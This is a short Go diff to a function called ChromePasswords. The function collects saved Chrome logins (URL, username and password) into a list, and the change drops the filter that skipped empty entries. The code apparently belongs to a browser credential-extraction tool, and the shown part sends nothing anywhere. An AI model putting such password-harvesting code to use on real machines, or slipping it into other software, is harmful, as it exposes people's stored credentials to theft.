@@ -83,13 +83,11 @@ func (c *Chrome) ChromePasswords() ([]PasswordModel, error) {
 			continue
 		}
 
-		if url != "" && username != "" && len(password) != 0 {
-			passwords = append(passwords, PasswordModel{
-				URL:      url,
-				Username: username,
-				Password: string(password),
-			})
-		}
+		passwords = append(passwords, PasswordModel{
+			URL:      url,
+			Username: username,
+			Password: string(password),
+		})
 	}
 
 	return passwords, nil
